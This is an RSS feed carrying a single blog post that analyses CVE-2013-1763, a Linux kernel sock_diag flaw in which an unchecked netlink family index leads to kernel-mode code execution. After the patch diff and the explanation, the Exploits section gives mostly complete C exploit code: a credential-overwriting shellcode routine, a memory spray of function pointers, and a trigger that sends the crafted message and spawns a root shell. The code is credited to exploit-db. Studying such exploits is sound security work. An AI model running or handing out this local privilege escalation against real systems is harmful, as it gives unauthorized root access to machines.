<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Blogs on fz84</title>
    <link>http://localhost:1313/categories/blogs/</link>
    <description>Recent content in Blogs on fz84</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 19 Apr 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/categories/blogs/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>CVE-2013-1763</title>
      <link>http://localhost:1313/CVE-2013-1763/</link>
      <pubDate>Sat, 19 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/CVE-2013-1763/</guid>
      <description>&lt;div class=&#34;document&#34;&gt;


&lt;div class=&#34;section&#34; id=&#34;vulnerability&#34;&gt;
&lt;h1&gt;Vulnerability&lt;/h1&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 4)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: diff

        diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
        index 602cd63..750f44f 100644
        --- a/net/core/sock_diag.c
        +++ b/net/core/sock_diag.c
        &amp;#64;&amp;#64; -121,6 +121,9 &amp;#64;&amp;#64; static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
                if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
                        return -EINVAL;

        +       if (req-&amp;gt;sdiag_family &amp;gt;= AF_MAX)
        +               return -EINVAL;
        +
                hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
                if (hndl == NULL)
                        err = -ENOENT;
                else
                        err = hndl-&amp;gt;dump(skb, nlh); // hndl-&amp;gt;dump executes !!


&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In &lt;tt class=&#34;docutils literal&#34;&gt;__sock_diag_rcv_msg&lt;/tt&gt; function, userland variable &lt;tt class=&#34;docutils literal&#34;&gt;&lt;span class=&#34;pre&#34;&gt;req-&amp;gt;sdiag_family&lt;/span&gt;&lt;/tt&gt; is passed uncheckly to &lt;tt class=&#34;docutils literal&#34;&gt;sock_diag_handler&lt;/tt&gt;, within which overflow and exploit happens.&lt;/p&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 26)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: c

        static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
        {
                if (sock_diag_handlers[family] == NULL)
                        request_module(&amp;quot;net-pf-%d-proto-%d-type-%d&amp;quot;, PF_NETLINK,
                                        NETLINK_SOCK_DIAG, family);

                mutex_lock(&amp;amp;sock_diag_table_mutex);
                return sock_diag_handlers[family];
        }

&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Here the function returns a pointer &lt;cite&gt;sock_diag_handlers + family&lt;/cite&gt;.&lt;/p&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 40)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: c

        struct sock_diag_handler {
                __u8 family;
                int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
        };
        hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
        hndl-&amp;gt;dump(skb, nlh); //(sock_diag_handlers + family + 8) executes !!

&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;All story told, here we find that finally &lt;tt class=&#34;docutils literal&#34;&gt;(sock_diag_handlers + family + 8)&lt;/tt&gt; executes in kernel mode.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&#34;section&#34; id=&#34;exploits&#34;&gt;
&lt;h1&gt;Exploits&lt;/h1&gt;
&lt;ol class=&#34;arabic simple&#34;&gt;
&lt;li&gt;Craft a piece of shell code.&lt;/li&gt;
&lt;li&gt;Calcualte the value of &lt;tt class=&#34;docutils literal&#34;&gt;family&lt;/tt&gt; which points &lt;tt class=&#34;docutils literal&#34;&gt;sock_diag_handlers + family + 8&lt;/tt&gt; to the shell code.&lt;/li&gt;
&lt;li&gt;Construct a package with large &lt;tt class=&#34;docutils literal&#34;&gt;family&lt;/tt&gt; and set it.&lt;/li&gt;
&lt;li&gt;You got it.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;section&#34; id=&#34;shell-code&#34;&gt;
&lt;h2&gt;Shell code&lt;/h2&gt;
&lt;ol class=&#34;arabic simple&#34;&gt;
&lt;li&gt;get &lt;tt class=&#34;docutils literal&#34;&gt;current&lt;/tt&gt; (pointer to the current process descriptor &lt;tt class=&#34;docutils literal&#34;&gt;task_struct&lt;/tt&gt;)&lt;/li&gt;
&lt;li&gt;Manipulate &lt;tt class=&#34;docutils literal&#34;&gt;process credentials&lt;/tt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 66)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: c

        static long ugid;
        void patch_current() {
                int i,j,k;
                char *current = *(char**)(((long)&amp;amp;i) &amp;amp; (-8192));
                long kbase = ((long)current)&amp;gt;&amp;gt;36;

                for (i=0; i&amp;lt;4000; i+=4) {
                        long *p = (void *)&amp;amp;current[i];
                        int *t = (void*) p[0];
                        if ((p[0] != p[1]) || ((p[0]&amp;gt;&amp;gt;36) != kbase)) continue;
                        for (j=0; j&amp;lt;20; j++) {
              for (k = 0; k &amp;lt; 8; k++)
                                  if (((int*)&amp;amp;ugid)[k%2] != t[j+k]) goto next;
                                for (i = 0; i &amp;lt; 8; i++) t[j+i] = 0;
                                for (i = 0; i &amp;lt; 10; i++) t[j+9+i] = -1;
                                return;
        next:;          }
                }
        }


&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#34;section&#34; id=&#34;crafted-a-package&#34;&gt;
&lt;h2&gt;Crafted a package&lt;/h2&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 92)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: c

        struct {
        struct nlmsghdr nlh;
        struct unix_diag_req r;
    } req;

    struct nlmsghdr {
                __u32           nlmsg_len;      /* Length of message including header */
                __u16           nlmsg_type;     /* Message content */
                __u16           nlmsg_flags;    /* Additional flags */
                __u32           nlmsg_seq;      /* Sequence number */
                __u32           nlmsg_pid;      /* Sending process port ID */
        };

        struct unix_diag_req {
                __u8    sdiag_family;
                __u8    sdiag_protocol;
                __u16   pad;
                __u32   udiag_states;
                __u32   udiag_ino;
                __u32   udiag_show;
                __u32   udiag_cookie[2];
        };


&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#34;section&#34; id=&#34;trigger&#34;&gt;
&lt;h2&gt;Trigger&lt;/h2&gt;
&lt;div class=&#34;system-message&#34;&gt;
&lt;p class=&#34;system-message-title&#34;&gt;System Message: WARNING/2 (&lt;tt class=&#34;docutils&#34;&gt;&amp;lt;stdin&amp;gt;&lt;/tt&gt;, line 121)&lt;/p&gt;
&lt;p&gt;Cannot analyze code. Pygments package not found.&lt;/p&gt;
&lt;pre class=&#34;literal-block&#34;&gt;
.. code-block:: c

        int main()
        {
          long u = getuid();
          long g = getgid();
          int i, f = socket(16,3,4);
          static int n[10] = {40,0x10014,0,0,45,-1};

          assert(mmap((void*)(1&amp;lt;&amp;lt;12), 1&amp;lt;&amp;lt;20, 3, 0x32, 0, 0)!=-1);

          setresuid(u,u,u); setresgid(g,g,g);
          ugid = (g&amp;lt;&amp;lt;32)|u;

          memcpy(1&amp;lt;&amp;lt;12, &amp;amp;patch_current, 1024);
          for (i = 0; i &amp;lt; (1&amp;lt;&amp;lt;17); i++) ((void**)(1&amp;lt;&amp;lt;12))[i] = &amp;amp;patch_current;
          send(f, n, sizeof(n), 0);
          setuid(0);
          return execl(&amp;quot;/bin/bash&amp;quot;, &amp;quot;-sh&amp;quot;, 0);
        }

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#34;section&#34; id=&#34;reference&#34;&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;p&gt;All credit goes to the authors of exploits &lt;a class=&#34;footnote-reference&#34; href=&#34;#id3&#34; id=&#34;id1&#34;&gt;[1]&lt;/a&gt; &lt;a class=&#34;footnote-reference&#34; href=&#34;#id4&#34; id=&#34;id2&#34;&gt;[2]&lt;/a&gt;.&lt;/p&gt;
&lt;table class=&#34;docutils footnote&#34; frame=&#34;void&#34; id=&#34;id3&#34; rules=&#34;none&#34;&gt;
&lt;colgroup&gt;&lt;col class=&#34;label&#34; /&gt;&lt;col /&gt;&lt;/colgroup&gt;
&lt;tbody valign=&#34;top&#34;&gt;
&lt;tr&gt;&lt;td class=&#34;label&#34;&gt;&lt;a class=&#34;fn-backref&#34; href=&#34;#id1&#34;&gt;[1]&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a class=&#34;reference external&#34; href=&#34;http://www.exploit-db.com/exploits/24746/&#34;&gt;http://www.exploit-db.com/exploits/24746/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table class=&#34;docutils footnote&#34; frame=&#34;void&#34; id=&#34;id4&#34; rules=&#34;none&#34;&gt;
&lt;colgroup&gt;&lt;col class=&#34;label&#34; /&gt;&lt;col /&gt;&lt;/colgroup&gt;
&lt;tbody valign=&#34;top&#34;&gt;
&lt;tr&gt;&lt;td class=&#34;label&#34;&gt;&lt;a class=&#34;fn-backref&#34; href=&#34;#id2&#34;&gt;[2]&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a class=&#34;reference external&#34; href=&#34;http://www.exploit-db.com/exploits/24555/&#34;&gt;http://www.exploit-db.com/exploits/24555/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
    </item>
    
  </channel>
</rss>